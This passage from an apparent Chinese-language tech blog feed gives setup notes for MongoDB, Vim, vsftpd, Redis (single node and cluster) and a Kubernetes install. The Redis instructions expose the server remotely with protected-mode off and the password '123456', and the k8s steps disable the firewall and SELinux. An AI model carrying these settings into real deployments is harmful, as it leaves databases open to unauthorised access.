class="hljs-literal">true</span>language-conf复制代码</code></pre><ol><li>启动mongodb服务</li></ol><p>后台启动</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /Users/admin/software/mongodb/bin/mongod --port 27017 --fork --dbpath=/Users/admin/software/mongodb/data/mongodb_data/ --logpath=/Users/admin/software/mongodb/data/mongodb_log/mongodb.log --logappend</code></pre><p>前台启动</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /Users/admin/software/mongodb/bin/mongod --port 27017  --dbpath=/Users/admin/software/mongodb/data/mongodb_data/ --logpath=/Users/admin/software/mongodb/data/mongodb_log/mongodb.log --logappend</code></pre><ol><li>使用mongo</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ./mongodb/bin/mongo</code></pre><ol><li>停止服务</li></ol><pre><code class="hljs bash">use admindb.shutdownServer();</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VIM</title>
      <link href="/2021/12/27/VIM/"/>
      <url>/2021/12/27/VIM/</url>
      
        <content type="html"><![CDATA[<h2 id="1-安装-git-和-curl"><a href="#1-安装-git-和-curl" class="headerlink" title="1. 安装 git 和 curl"></a>1. 安装 git 和 curl</h2><blockquote><p>yum install git curl</p></blockquote><h2 id="2-安装-vim-plugin"><a href="#2-安装-vim-plugin" class="headerlink" title="2. 安装 vim-plugin"></a>2. 安装 vim-plugin</h2><blockquote><p><a href="https://github.com/junegunn/vim-plug">参考连接</a></p></blockquote><p>可以修改 hosts 文件解决访问不了 github 的问题</p><pre><code class="hljs bash"><span class="hljs-comment"># github</span>199.232.68.133 raw.githubusercontent.com199.232.68.133 user-images.githubusercontent.com199.232.68.133 avatars2.githubusercontent.com199.232.68.133 avatars1.githubusercontent.com</code></pre><h2 id="3-vimrc-配置文件"><a href="#3-vimrc-配置文件" class="headerlink" title="3. vimrc 配置文件"></a>3. vimrc 配置文件</h2><blockquote><p>vim ~&#x2F;.vimrc</p></blockquote><pre><code class="hljs bash"><span class="hljs-built_in">let</span> mapleader=<span class="hljs-string">&quot; &quot;</span>syntax on<span class="hljs-string">&quot;显示行号</span><span class="hljs-string">set number</span><span class="hljs-string"></span><span class="hljs-string">&quot;</span>显示鼠标线<span class="hljs-built_in">set</span> cursorline<span class="hljs-string">&quot;字体不会超出视野</span><span class="hljs-string">set wrap</span><span class="hljs-string">&quot;</span>在底线显示当前命令<span class="hljs-built_in">set</span> showcmd<span class="hljs-string">&quot;命令提示</span><span class="hljs-string">set wildmenu</span><span class="hljs-string"></span><span class="hljs-string">&quot;</span>兼容vi<span class="hljs-built_in">set</span> nocompatible<span class="hljs-string">&quot;识别不同的文件模式</span><span class="hljs-string">filetype on</span><span class="hljs-string">filetype indent on</span><span class="hljs-string">filetype plugin on</span><span class="hljs-string">filetype plugin indent on</span><span class="hljs-string">&quot;</span>编辑器可以使用鼠标<span class="hljs-built_in">set</span> mouse=a<span class="hljs-built_in">set</span> encoding=utf-8<span class="hljs-string">&quot;兼容终端配色问题</span><span class="hljs-string">&quot;</span><span class="hljs-built_in">let</span> &amp;t_ut=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&quot;缩进</span><span class="hljs-string">set expandtab</span><span class="hljs-string">set tabstop=2</span><span class="hljs-string">set shiftwidth=2</span><span class="hljs-string">set softtabstop=2</span><span class="hljs-string">&quot;</span>行尾<span class="hljs-string">&quot;set list</span><span class="hljs-string">&quot;</span>保持预览在上下5行之间<span class="hljs-built_in">set</span> scrolloff=5<span class="hljs-string">&quot;退格键可以回到行首</span><span class="hljs-string">set backspace=indent,eol,start</span><span class="hljs-string">&quot;</span>收起代码<span class="hljs-built_in">set</span> foldmethod=indent<span class="hljs-built_in">set</span> foldlevel=99<span class="hljs-string">&quot;底下状态栏等于2</span><span class="hljs-string">set laststatus=2</span><span class="hljs-string">set autochdir</span><span class="hljs-string">&quot;</span>重新打开文件光标会显示上一次打开的位置au BufReadPost * <span class="hljs-keyword">if</span> line(<span class="hljs-string">&quot;&#x27;\&quot;&quot;</span>) &gt; 1 &amp;&amp; line(<span class="hljs-string">&quot;&#x27;\&quot;&quot;</span>) &lt;= line(<span class="hljs-string">&quot;$&quot;</span>) | exe <span class="hljs-string">&quot;normal! g&#x27;\&quot;&quot;</span> | endif<span class="hljs-string">&quot;1. noremap a b | 改键位,a 键 替换 b键盘</span><span class="hljs-string">&quot;</span>加快上下左右浏览的速度noremap J 5jnoremap K 5knoremap H 5hnoremap L 5l<span class="hljs-string">&quot;查看上/下一个搜索接口并显示在中间</span><span class="hljs-string">noremap n nzz</span><span class="hljs-string">noremap n nzz</span><span class="hljs-string">&quot;</span>空格回车:去除搜索高亮noremap &lt;leader&gt;&lt;cr&gt; :nohlsearch&lt;cr&gt;<span class="hljs-string">&quot;搜索高亮</span><span class="hljs-string">set hlsearch</span><span class="hljs-string">&quot;</span>重新打开文件不会显示搜索高亮<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;nohlsearch&quot;</span><span class="hljs-built_in">set</span> incsearch<span class="hljs-string">&quot;忽略大小写</span><span class="hljs-string">set ignorecase</span><span class="hljs-string">&quot;</span>智能大小写<span class="hljs-built_in">set</span> smartcase<span class="hljs-string">&quot;2. map s :w&lt;cr&gt; | 快捷键</span><span class="hljs-string">map s &lt;nop&gt;</span><span class="hljs-string">&quot;</span>保存map S :w&lt;cr&gt;<span class="hljs-string">&quot;退出</span><span class="hljs-string">map Q :q&lt;cr&gt;</span><span class="hljs-string">&quot;</span>更新配置文件map R :<span class="hljs-built_in">source</span> <span class="hljs-variable">$MYVIMRC</span>&lt;cr&gt;<span class="hljs-string">&quot;3. &lt;operation&gt; &lt;motion&gt;</span><span class="hljs-string">&quot;</span>x : 删除当前字符<span class="hljs-string">&quot;d + 方向键 + number 删除方向上的 number 个字符</span><span class="hljs-string">&quot;</span>y + 方向键 + number 复制方向上的 number 个字符<span class="hljs-string">&quot;c + 方向键 + number 删除并进入写入模式</span><span class="hljs-string">&quot;</span>w : 移动一个词。<span class="hljs-string">&quot;ciw : 修改当前词；ci&quot;</span> : 将<span class="hljs-string">&quot;符号内的词全部修改；</span><span class="hljs-string">&quot;</span>yi<span class="hljs-string">&quot; : 将&quot;</span>符号内的词全部复制; di<span class="hljs-string">&quot; : 将&quot;</span>符号内的词全部删除。<span class="hljs-string">&quot;f&quot;</span> : 查找下一个<span class="hljs-string">&quot;符号。</span><span class="hljs-string">&quot;</span><span class="hljs-built_in">df</span><span class="hljs-string">&quot; : 删除到下一个&quot;</span>符号的内容；yf<span class="hljs-string">&quot; : 复制到下一个&quot;</span>符号的内容；<span class="hljs-string">&quot;cf&quot;</span> : 删除到下一个<span class="hljs-string">&quot;符号的内容并进入写入模式</span><span class="hljs-string">&quot;</span>zz : 将当前行显示在中间<span class="hljs-string">&quot;4. :命令模式</span><span class="hljs-string">&quot;</span><span class="hljs-built_in">split</span> : 上下分屏；vsplit : 左右分屏map sk :<span class="hljs-built_in">set</span> nosplitbelow&lt;CR&gt;:<span class="hljs-built_in">split</span>&lt;CR&gt;map sj :<span class="hljs-built_in">set</span> splitbelow&lt;CR&gt;:<span class="hljs-built_in">split</span>&lt;CR&gt;map sh :<span class="hljs-built_in">set</span> nosplitright&lt;CR&gt;:vsplit&lt;CR&gt;map sl :<span class="hljs-built_in">set</span> splitright&lt;CR&gt;:vsplit&lt;CR&gt;<span class="hljs-string">&quot;7. ctrl + w + 方向 : 分屏间光标切换</span><span class="hljs-string">&quot;</span>空格 + 方向 : 来切切换屏幕<span class="hljs-string">&quot;上下左右屏幕切换</span><span class="hljs-string">map &lt;LEADER&gt;k &lt;C-w&gt;k</span><span class="hljs-string">map &lt;LEADER&gt;j &lt;C-w&gt;j</span><span class="hljs-string">map &lt;LEADER&gt;h &lt;C-w&gt;h</span><span class="hljs-string">map &lt;LEADER&gt;l &lt;C-w&gt;l</span><span class="hljs-string">&quot;</span>8. :vertical resize-5 设置当前分屏大小map wk :res +5&lt;CR&gt;map wj :res -5&lt;CR&gt;map wh :vertical resize-5&lt;CR&gt;map wl :vertical resize+5&lt;CR&gt;<span class="hljs-string">&quot;9. :tabe 打开新的标签</span><span class="hljs-string">map tt :tabe&lt;CR&gt;</span><span class="hljs-string">&quot;</span>切换标签页map tl :+tabnext&lt;CR&gt;map th :-tabnext&lt;CR&gt;<span class="hljs-string">&quot;6. 打开文件</span><span class="hljs-string">&quot;</span>:e path : 打开路径下的文件<span class="hljs-string">&quot;5. v 模式：鼠标单击. shift + v : 行模式.</span><span class="hljs-string">&quot;</span>control + v : 可视块模式(禅模式); 选择后按 <span class="hljs-built_in">shift</span> + i 修改内容；再esc生效<span class="hljs-string">&quot; v 模式选择后，可以输入:normal I&quot;</span>，进行统一注释call plug#begin(<span class="hljs-string">&#x27;~/.vim/plugged&#x27;</span>)Plug <span class="hljs-string">&#x27;vim-airline/vim-airline&#x27;</span>Plug <span class="hljs-string">&#x27;connorholyday/vim-snazzy&#x27;</span>call plug#end()<span class="hljs-string">&quot;设置颜色</span><span class="hljs-string">colorscheme snazzy</span><span class="hljs-string">let g:SnazzyTransparent = 1</span><span class="hljs-string"></span></code></pre><h2 id="4-安装插件"><a href="#4-安装插件" class="headerlink" title="4.安装插件"></a>4.安装插件</h2><blockquote><p>:PlugInstall</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VSFTPD</title>
      <link href="/2021/12/16/vsftpd/"/>
      <url>/2021/12/16/vsftpd/</url>
      
        <content type="html"><![CDATA[<h1 id="在Ubuntu1804搭建vsftpd服务"><a href="#在Ubuntu1804搭建vsftpd服务" class="headerlink" title="在Ubuntu1804搭建vsftpd服务"></a>在Ubuntu1804搭建vsftpd服务</h1><blockquote><ol><li>环境：在 Ubuntu1804 的 Docker 环境下。</li><li>要求：要在 Docker 容器中使用 Ftp 服务推送数据到 Windows10 的目录下。</li><li>方案：在 Ubuntu1804 搭建基于 Vsftpd，设置 Ftp 的目录在虚拟机和物理机的共享目录下。</li></ol></blockquote><hr><h2 id="1-更新下载源"><a href="#1-更新下载源" class="headerlink" title="1. 更新下载源"></a>1. 更新下载源</h2><ol><li>编辑下载源</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">备份源文件</span>sudo cp -rfv /etc/apt/sources.list /etc/apt/sources.list.back<span class="hljs-meta prompt_"># </span><span class="language-bash">编辑source.list文件</span>sudo vi /etc/apt/sources.listlanguage-shell复制代码</code></pre><ol><li>修改下载源</li></ol><blockquote><p>全选快捷键：shift+v 选中一行，shift+g 调到结尾实现全选<br>删除所选择的内容：dd<br>按 i 进入插入模式，复制如下内容：</p></blockquote><pre><code class="hljs shell">deb http://mirrors.163.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ trusty-backports main restricted universe multiverselanguage-shell复制代码</code></pre><h2 id="2-安装-vsftpd"><a href="#2-安装-vsftpd" class="headerlink" title="2. 安装 vsftpd"></a>2. 安装 vsftpd</h2><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update &amp;&amp; <span class="hljs-built_in">sudo</span> apt install vsftpd</code></pre><blockquote><p>安装之后，检查 vsftpd 的状态</p></blockquote><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> service vsftpd status</code></pre><h2 id="3-配置防火墙"><a href="#3-配置防火墙" class="headerlink" title="3. 配置防火墙"></a>3. 配置防火墙</h2><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ufw allow OpenSSH</code></pre><p>让我们为 FTP 打开端口 20 和 21，为被动 FTP 打开端口 40000-50000。我们还将为 TLS 打开端口 990，稍后将设置这个端口。</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ufw allow 20/tcp<span class="hljs-built_in">sudo</span> ufw allow 21/tcp<span class="hljs-built_in">sudo</span> ufw allow 40000:50000/tcp<span class="hljs-built_in">sudo</span> ufw allow 990/tcp</code></pre><p>现在，如果还没有启用防火墙，就启用它。如果有关于破坏 SSH 连接的警告，请按 y 和 ENTER。</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ufw <span class="hljs-built_in">enable</span></code></pre><p>要检查防火墙的状态，请运行:</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ufw status</code></pre><h2 id="4-创建-FTP-用户"><a href="#4-创建-FTP-用户" class="headerlink" title="4. 创建 FTP 用户"></a>4. 创建 FTP 用户</h2><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> adduser ftpuser</code></pre><p>在 nano 中打开 SSH 配置。</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nano /etc/ssh/sshd_config</code></pre><p>将以下代码添加到文件底部，用要拒绝 SSH 和 SFTP 访问的用户替换 ftpuser。</p><pre><code class="hljs none">DenyUsers ftpuserlanguage-none复制代码</code></pre><p>要保存文件并退出，请按 CTRL + x，按 y，然后按 ENTER。<br>重新启动 SSH 服务。</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> service sshd restart</code></pre><h2 id="5-上传到主文件夹"><a href="#5-上传到主文件夹" class="headerlink" title="5. 上传到主文件夹"></a>5. 上传到主文件夹</h2><pre><code class="hljs bash"><span class="hljs-comment"># 自定义ftp上传目录</span><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /vagrant/ftpdata</code></pre><p>将此目录的所有权分配给新的 FTP 用户</p><pre><code class="hljs bash"><span class="hljs-comment"># 自定义ftp上传目录</span><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> ftpuser:ftpuser /vagrant/ftpdata</code></pre><h2 id="6-配置-vsftpd"><a href="#6-配置-vsftpd" class="headerlink" title="6. 配置 vsftpd"></a>6. 配置 vsftpd</h2><p>在编辑配置文件之前，创建一个备份。</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> /etc/vsftpd.conf /etc/vsftpd.conf.bak</code></pre><p>现在，在 nano 编辑器中打开配置文件。</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nano /etc/vsftpd.conf</code></pre><p>你需要去下面的文件，并确保设置匹配那些下面。注意: 你可以使用 CTRL + w 来搜索 nano</p><pre><code class="hljs none">write_enable=YESchroot_local_user=YESlocal_umask=022language-none复制代码</code></pre><p>将以下内容粘贴到文件底部。(粘贴 nano，按下鼠标右键)</p><pre><code class="hljs bash">force_dot_files=YESpasv_min_port=40000pasv_max_port=50000<span class="hljs-comment"># 自定义ftp上传目录</span>local_root=/vagrant/ftpdataallow_writeable_chroot=YES</code></pre><p>要保存文件并退出，请按 CTRL + x，按 y，然后按 ENTER。</p><p>重新启动 vsftpd。</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart vsftpd</code></pre><h2 id="7-测试-FTP"><a href="#7-测试-FTP" class="headerlink" title="7. 测试 FTP"></a>7. 测试 FTP</h2><p>查看日志</p><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tail</span> /var/log/vsftpd.log -n 200</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>REDIS</title>
      <link href="/2021/10/06/Redis/"/>
      <url>/2021/10/06/Redis/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker安装Reids"><a href="#Docker安装Reids" class="headerlink" title="Docker安装Reids"></a>Docker安装Reids</h2><h3 id="redis安装"><a href="#redis安装" class="headerlink" title="redis安装"></a>redis安装</h3><blockquote><p><a href="https://www.jianshu.com/p/363e8ac2d9b3">参考链接</a></p></blockquote><h3 id="创建挂载的目录"><a href="#创建挂载的目录" class="headerlink" title="创建挂载的目录"></a>创建挂载的目录</h3><pre><code class="hljs shell">mkdir -p /home/docker-data/redis/confmkdir -p /home/docker-data/redis/datalanguage-shell复制代码</code></pre><h3 id="新增Redis配置文件"><a href="#新增Redis配置文件" class="headerlink" title="新增Redis配置文件"></a>新增Redis配置文件</h3><blockquote><p>将bind 127.0.0.1注释掉，保证可以从远程访问到该Redis，不单单是从本地</p></blockquote><blockquote><p>appendonly：开启数据持久化到磁盘</p></blockquote><blockquote><p>requirepass：设置访问密码为123456</p></blockquote><pre><code class="hljs shell">vim /home/docker-data/redis/conf/redis.conflanguage-shell复制代码<span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">bind</span> 127.0.0.1</span>protected-mode noappendonly yesrequirepass 123456</code></pre><h3 id="创建redis容器并启动"><a href="#创建redis容器并启动" class="headerlink" title="创建redis容器并启动"></a>创建redis容器并启动</h3><blockquote><p>redis redis-server 实现让docker容器运行时使用本地配置的Redis配置文件的功能了</p></blockquote><pre><code class="hljs shell">docker run \--name redis \-p 6379:6379 \-v /home/docker-data/redis/data:/data \-v /home/docker-data/redis/conf/redis.conf:/etc/redis/redis.conf \ -d redis redis-server /etc/redis/redis.conflanguage-shell复制代码</code></pre><h3 id="进入容器内部进行测试"><a href="#进入容器内部进行测试" class="headerlink" title="进入容器内部进行测试"></a>进入容器内部进行测试</h3><ol><li>进入容器</li></ol><pre><code class="hljs shell">docker exec -it redis redis-clilanguage-shell复制代码</code></pre><ol><li>设置密码</li></ol><pre><code class="hljs bash">auth 123456</code></pre><ol><li>测试</li></ol><pre><code class="hljs shell">set a 1get alanguage-shell复制代码</code></pre><h2 id="K8s安装Reids集群"><a href="#K8s安装Reids集群" class="headerlink" title="K8s安装Reids集群"></a>K8s安装Reids集群</h2><h3 id="1-设置redis集群网卡及查看"><a href="#1-设置redis集群网卡及查看" class="headerlink" title="1. 设置redis集群网卡及查看"></a>1. 设置redis集群网卡及查看</h3><pre><code class="hljs shell">docker network create redis --subnet 172.38.0.0/16docker network lsdocker network inspect redislanguage-shell复制代码</code></pre><hr><h3 id="2-创建redis节点及设置"><a href="#2-创建redis节点及设置" class="headerlink" title="2. 创建redis节点及设置"></a>2. 创建redis节点及设置</h3><pre><code class="hljs shell">for port in $(seq 1 6);domkdir -p /mydata/redis/node-$&#123;port&#125;/conftouch /mydata/redis/node-$&#123;port&#125;/conf/redis.confcat &lt;&lt; EOF &gt;/mydata/redis/node-$&#123;port&#125;/conf/redis.confport 6379bind 0.0.0.0cluster-enabled yescluster-config-file nodes.confcluster-node-timeout 5000cluster-announce-ip 172.38.0.1$&#123;port&#125;cluster-announce-port 6379cluster-announce-bus-port 16379appendonly yesEOFdone language-shell复制代码</code></pre><hr><h3 id="3-拉取redis镜像并启动redis节点"><a href="#3-拉取redis镜像并启动redis节点" class="headerlink" title="3. 拉取redis镜像并启动redis节点"></a>3. 拉取redis镜像并启动redis节点</h3><ol><li>节点1</li></ol><pre><code class="hljs shell">docker run -p 6371:6379 -p 16371:16379 --name redis-1 \ -v /mydata/redis/node-1/data:/data \ -v /mydata/redis/node-1/conf/redis.conf:/etc/redis/redis.conf \ -d --net redis --ip 172.38.0.11 redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conflanguage-shell复制代码</code></pre><p>2 . 节点2</p><pre><code class="hljs shell">docker run -p 6372:6379 -p 16372:16379 --name redis-2 \ -v /mydata/redis/node-2/data:/data \ -v /mydata/redis/node-2/conf/redis.conf:/etc/redis/redis.conf \ -d --net redis --ip 172.38.0.12 redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conflanguage-shell复制代码</code></pre><p>3 . 节点3</p><pre><code class="hljs shell">docker run -p 6373:6379 -p 16373:16379 --name redis-3 \ -v /mydata/redis/node-3/data:/data \ -v /mydata/redis/node-3/conf/redis.conf:/etc/redis/redis.conf \ -d --net redis --ip 172.38.0.13 redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conflanguage-shell复制代码</code></pre><p>4 . 节点4</p><pre><code class="hljs shell">docker run -p 6374:6379 -p 16374:16379 --name redis-4 \ -v /mydata/redis/node-4data:/data \ -v /mydata/redis/node-4/conf/redis.conf:/etc/redis/redis.conf \ -d --net redis --ip 172.38.0.14 redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conflanguage-shell复制代码</code></pre><p>5 . 节点5</p><pre><code class="hljs shell">docker run -p 6375:6379 -p 16375:16379 --name redis-5 \ -v /mydata/redis/node-5/data:/data \ -v /mydata/redis/node-5/conf/redis.conf:/etc/redis/redis.conf \ -d --net redis --ip 172.38.0.15 redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conflanguage-shell复制代码</code></pre><p>6 . 节点6</p><pre><code class="hljs shell">docker run -p 6376:6379 -p 16376:16379 --name redis-6 \ -v /mydata/redis/node-6/data:/data \ -v /mydata/redis/node-6/conf/redis.conf:/etc/redis/redis.conf \ -d --net redis --ip 172.38.0.16 redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conflanguage-shell复制代码</code></pre><hr><h3 id="4-以交互模式进入redis节点内"><a href="#4-以交互模式进入redis节点内" class="headerlink" title="4. 以交互模式进入redis节点内"></a>4. 以交互模式进入redis节点内</h3><pre><code class="hljs shell">docker exec -it redis-1 /bin/shlanguage-shell复制代码</code></pre><hr><h3 id="5-创建redis集群"><a href="#5-创建redis集群" class="headerlink" title="5. 创建redis集群"></a>5. 创建redis集群</h3><pre><code class="hljs shell">redis-cli --cluster create 172.38.0.11:6379 172.38.0.12:6379 \172.38.0.13:6379 172.38.0.14:6379 172.38.0.15:6379 \172.38.0.16:6379 --cluster-replicas 1language-shell复制代码</code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><a href="https://blog.csdn.net/weixin_41896265/article/details/108245264">参考链接</a></h3><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><blockquote><p>可变对象，在1M大小以下空间扩展速度为1倍，1M以上速度为每次1M，最大512M，超过会报错。</p></blockquote><pre><code class="hljs redis">language-redis复制代码</code></pre><h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><blockquote><p>可以保存2^32-1个item<br>列表的插入数据O(1),索引定位O(n)<br>主要用于队列。rpush lpop<br>用于栈：rpush rpop</p></blockquote><pre><code class="hljs redis">lpush key value1 vlue2rpush key value1 vlue2lpop key rpop keylinsert key before v3 v2linsert key after v1 v2lrange key start end [返回范围内的元素]iset key index value [替换值，慎用]lindex key index [返回索引值，慎用]language-redis复制代码</code></pre><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><h2 id="zset"><a href="#zset" class="headerlink" title="zset"></a>zset</h2><hr>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>K8s_lab</title>
      <link href="/2021/09/20/K8s-lab/"/>
      <url>/2021/09/20/K8s-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-k8s-install"><a href="#第一章-k8s-install" class="headerlink" title="第一章 k8s install"></a>第一章 k8s install</h1><h2 id="1-1-该文基于k8s三件套以下版本"><a href="#1-1-该文基于k8s三件套以下版本" class="headerlink" title="1.1 该文基于k8s三件套以下版本"></a>1.1 该文基于k8s三件套以下版本</h2><blockquote><p>kubectl v1.20.1-0<br>kubeadm v1.20.1-0<br>kubelet v1.20.1-0</p></blockquote><hr><h2 id="1-2-安装docker"><a href="#1-2-安装docker" class="headerlink" title="1.2 安装docker"></a>1.2 安装docker</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装docker所需的工具</span>yum install -y yum-utils device-mapper-persistent-data lvm2<span class="hljs-meta prompt_"># </span><span class="language-bash">配置阿里云的docker源</span>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="hljs-meta prompt_"># </span><span class="language-bash">指定安装这个版本的docker-ce</span>yum install -y docker-ce-18.09.9-3.el7<span class="hljs-meta prompt_"># </span><span class="language-bash">启动docker</span>systemctl enable docker &amp;&amp; systemctl start dockerlanguage-shell复制代码</code></pre><hr><h2 id="1-3-only-centos-use"><a href="#1-3-only-centos-use" class="headerlink" title="1.3 only centos use"></a>1.3 only centos use</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭防火墙</span>systemctl disable firewalldsystemctl stop firewalld<span class="hljs-meta prompt_"># </span><span class="language-bash">关闭selinux</span><span class="hljs-meta prompt_"># </span><span class="language-bash">临时禁用selinux</span>setenforce 0<span class="hljs-meta prompt_"># </span><span class="language-bash">永久关闭 修改/etc/sysconfig/selinux文件设置</span>sed -i &#x27;s/SELINUX=permissive/SELINUX=disabled/&#x27; /etc/sysconfig/selinuxsed -i &quot;s/SELINUX=enforcing/SELINUX=disabled/g&quot; /etc/selinux/config<span class="hljs-meta prompt_"># </span><span class="language-bash">禁用交换分区</span>swapoff -a<span class="hljs-meta prompt_"># </span><span class="language-bash">永久禁用，打开/etc/fstab注释掉swap那一行。</span>sed -i &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab<span class="hljs-meta prompt_"># </span><span class="language-bash">修改内核参数</span>cat &lt;&lt;EOF &gt;  /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1EOFsysctl --systemcat &lt;&lt;EOF | sudo tee /etc/modules-load.d/k8s.confbr_netfilterEOFcat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1EOFsudo sysctl --systemlanguage-shell复制代码</code></pre><hr><h2 id="1-4-更换k8s-yum源"><a href="#1-4-更换k8s-yum源" class="headerlink" title="1.4 更换k8s yum源"></a>1.4 更换k8s yum源</h2><pre><code class="hljs shell">cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=1repo_gpgcheck=1gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOFlanguage-shell复制代码</code></pre><hr><h2 id="1-5-安装-k8s三件套"><a href="#1-5-安装-k8s三件套" class="headerlink" title="1.5 安装 k8s三件套"></a>1.5 安装 k8s三件套</h2><pre><code class="hljs shell">yum install -y kubelet-1.20.1-0 kubeadm-1.20.1-0 kubectl-1.20.1-0 --disableexcludes=kubernetessystemctl enable --now kubeletlanguage-shell复制代码</code></pre><hr><h2 id="1-6-编辑docker文件"><a href="#1-6-编辑docker文件" class="headerlink" title="1.6 编辑docker文件"></a>1.6 编辑docker文件</h2><pre><code class="hljs bash"><span class="hljs-comment"># 创建文件 </span>vim /etc/docker/daemon.json<span class="hljs-comment"># 并写入</span>&#123;    <span class="hljs-string">&quot;exec-opts&quot;</span>: [<span class="hljs-string">&quot;native.cgroupdriver=systemd&quot;</span>]&#125;</code></pre><hr><h2 id="1-7-设置docker-pull-代理"><a href="#1-7-设置docker-pull-代理" class="headerlink" title="1.7 设置docker pull 代理"></a>1.7 设置docker pull 代理</h2><pre><code class="hljs bash"><span class="hljs-comment"># 设置docker代理</span><span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.dvim proxy.conf<span class="hljs-comment"># 输入以下内容</span>[Service]Environment=<span class="hljs-string">&quot;HTTP_PROXY=http://192.168.18.140:8889/&quot;</span>Environment=<span class="hljs-string">&quot;HTTPS_PROXY=http://192.168.18.140:8889/&quot;</span>Environment=<span class="hljs-string">&quot;NO_PROXY=localhost,127.0.0.1,192.168.18.140&quot;</span>systemctl daemon-reloadsystemctl restart docker</code></pre><hr><h2 id="1-8-下载镜像"><a href="#1-8-下载镜像" class="headerlink" title="1.8 下载镜像"></a>1.8 下载镜像</h2><pre><code class="hljs shell">kubeadm config images pull<span class="hljs-meta prompt_"># </span><span class="language-bash">可能不需要执行下面的命令</span>docker pull quay.mirrors.ustc.edu.cn/coreos/flannel:v0.14.0docker tag quay.mirrors.ustc.edu.cn/coreos/flannel:v0.14.0  quay.io/coreos/flannel:v0.14.0docker rmi quay.mirrors.ustc.edu.cn/coreos/flannel:v0.14.0language-shell复制代码</code></pre><hr><h2 id="1-9-创建集群"><a href="#1-9-创建集群" class="headerlink" title="1.9 创建集群"></a>1.9 创建集群</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在master上创建集群</span><span class="hljs-meta prompt_"># </span><span class="language-bash">192.168.018.200为masteip；10.244.0.0/16为pod地址池；kubeadm-config.yaml是配置 kubelet 的 cgroup 驱动的文件</span><span class="hljs-meta prompt_"># </span><span class="language-bash">kubeadm init --apiserver-advertise-address 192.168.18.200 --pod-network-cidr=10.244.0.0/16 --config kubeadm-config.yaml</span>kubeadm init --apiserver-advertise-address 192.168.18.200 --pod-network-cidr=10.244.0.0/16<span class="hljs-meta prompt_"># </span><span class="language-bash">接着还需要执行如下命令安装 Pod 网络（这里我们使用 flannel），否则 Pod 之间无法通信。</span><span 